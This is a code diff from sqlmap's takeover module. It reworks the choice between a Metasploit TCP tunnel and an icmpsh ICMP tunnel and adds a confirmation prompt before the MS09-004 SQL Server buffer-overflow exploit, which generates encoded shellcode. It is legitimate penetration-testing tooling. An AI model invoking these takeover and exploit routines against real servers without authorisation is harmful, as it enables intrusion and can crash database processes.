@@ -91,39 +91,39 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
 
         self.checkDbmsOs()
 
-        msg = "how do you want to establish the tunnel?"
-        msg += "\n[1] TCP: Metasploit Framework (default)"
-
         if Backend.isOs(OS.WINDOWS):
+            msg = "how do you want to establish the tunnel?"
+            msg += "\n[1] TCP: Metasploit Framework (default)"
             msg += "\n[2] ICMP: icmpsh - ICMP tunneling"
             valids = ( 1, 2 )
+
+            while True:
+                tunnel = readInput(msg, default=1)
+
+                if isinstance(tunnel, basestring) and tunnel.isdigit() and int(tunnel) in valids:
+                    tunnel = int(tunnel)
+                    break
+
+                elif isinstance(tunnel, int) and tunnel in valids:
+                    break
+
+                else:
+                    warnMsg = "invalid value, valid values are 1 and 2"
+                    logger.warn(warnMsg)
         else:
-            valids = ( 1, )
+            tunnel = 1
 
-        while True:
-            tunnel = readInput(msg, default=1)
-
-            if isinstance(tunnel, basestring) and tunnel.isdigit() and int(tunnel) in valids:
-                tunnel = int(tunnel)
-                break
-
-            elif isinstance(tunnel, int) and tunnel in valids:
-                break
-
-            elif len(valids) == 1:
-                warnMsg = "invalid value, valid value is 1"
-                logger.warn(warnMsg)
-            else:
-                warnMsg = "invalid value, valid values are 1 and 2"
-                logger.warn(warnMsg)
+            debugMsg = "the tunnel can be established only via TCP when "
+            debugMsg += "the back-end DBMS is not Windows"
+            logger.debug(debugMsg)
 
         if tunnel == 2 and not Backend.isOs(OS.WINDOWS):
-                errMsg = "icmpsh slave is only supported on Windows at "
-                errMsg += "the moment. The back-end database server is "
-                errMsg += "not. sqlmap will fallback to TCP (Metasploit)"
-                logger.error(errMsg)
+            errMsg = "icmpsh slave is only supported on Windows at "
+            errMsg += "the moment. The back-end database server is "
+            errMsg += "not. sqlmap will fallback to TCP (Metasploit)"
+            logger.error(errMsg)
 
-                tunnel = 1
+            tunnel = 1
 
         if tunnel == 2:
             isAdmin = runningAsAdmin()
@@ -207,16 +207,6 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                         debugMsg = "by default MySQL on Windows runs as SYSTEM "
                         debugMsg += "user, no need to privilege escalate"
                         logger.debug(debugMsg)
-
-                elif not Backend.isOs(OS.WINDOWS) and conf.privEsc:
-                    # Unset --priv-esc if the back-end DBMS underlying operating
-                    # system is not Windows
-                    conf.privEsc = False
-
-                    warnMsg = "sqlmap does not implement any operating system "
-                    warnMsg += "user privilege escalation technique when the "
-                    warnMsg += "back-end DBMS underlying system is not Windows"
-                    logger.warn(warnMsg)
             elif tunnel == 2:
                 self.uploadIcmpshSlave(web=web)
                 self.icmpPwn()
@@ -326,10 +316,20 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         infoMsg += "buffer overflow (MS09-004)"
         logger.info(infoMsg)
 
-        self.initEnv(mandatory=False, detailed=True)
-        self.getRemoteTempPath()
-        self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
-        self.bof()
+        msg = "this technique is likely to DoS the DBMS process, are you "
+        msg += "sure that you want to carry with the exploit? [y/N] "
+        inp = readInput(msg, default="N")
+
+        if inp and inp[0].lower() == "y":
+            dos = True
+        else:
+            dos = False
+
+        if dos:
+            self.initEnv(mandatory=False, detailed=True)
+            self.getRemoteTempPath()
+            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
+            self.bof()
 
     def uncPathRequest(self):
         errMsg = "'uncPathRequest' method must be defined "
